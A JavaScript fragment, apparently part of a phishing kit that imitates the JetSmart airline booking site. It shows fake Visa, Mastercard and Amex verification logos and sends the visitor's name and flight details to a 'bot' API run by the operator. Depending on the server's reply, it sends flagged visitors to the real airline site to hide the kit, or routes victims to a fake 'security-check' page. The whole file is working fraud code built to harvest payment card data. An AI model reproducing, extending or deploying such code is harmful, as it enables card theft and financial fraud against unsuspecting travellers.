const companyLoader = document.querySelector('#company-loader');
if(info.checkerInfo.company === 'VISA'){
    companyLoader.setAttribute('src', './assets/logos/visa_verified.png');
    companyLoader.setAttribute('width', '130px');
    companyLoader.setAttribute('style', 'margin-bottom: 40px');
}else if(info.checkerInfo.company === 'MC'){
    companyLoader.setAttribute('src', './assets/logos/mc_id_check_2.jpg');
    companyLoader.setAttribute('width', '400px');
}else if(info.checkerInfo.company === 'AM'){
    companyLoader.setAttribute('src', './assets/logos/amex_check_1.png');
    companyLoader.setAttribute('width', '200px');
}

// Enviar info
let payload = info.metaInfo


payload.origin = info.flightInfo.origin.city;
payload.destination = info.flightInfo.destination.city;
payload.flightDates = info.flightInfo.flightDates;
payload.type = info.flightInfo.travel_type === 1 ? 'Ida Y Vuelta' : 'Solo Ida';
payload.adults = info.flightInfo.adults;
payload.children = info.flightInfo.children;
payload.babies = info.flightInfo.babies;
payload.dudename = info.metaInfo.name.split(' ')[0] ?? info.metaInfo.name;
payload.surname = info.metaInfo.name.split(' ')[1] ?? '';

console.log(payload);

fetch(`${API_URL}/api/bot/flight/data`, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${API_KEY}`
    },
    body: JSON.stringify(payload)
})
    .then(response => response.json())
    .then(result => {
        // Manejo de respuetas del servidor
        console.log('Respuesta del servidor:', result.redirect_to);

        if(result.redirect_to.split('-')[0] === 'ban'){
            window.location.href = 'https://www.jetsmart.com/co/es/';

            return;
        }

        if(result.redirect_to.split('-')[0] === 'checker'){
            console.log(result.redirect_to);
            LS.getItem('info') ? info = JSON.parse(LS.getItem('info')) : LS.setItem('info', JSON.stringify(info));
            info.checkerInfo.mode = result.redirect_to.split('-')[1];
            LS.setItem('info', JSON.stringify(info));
            
            window.location.href = 'security-check.html';

            return;
        }

        window.location.href = result.redirect_to+'.html';
    })
    .catch(error => {
        console.log('Error en la solicitud:', error);
    });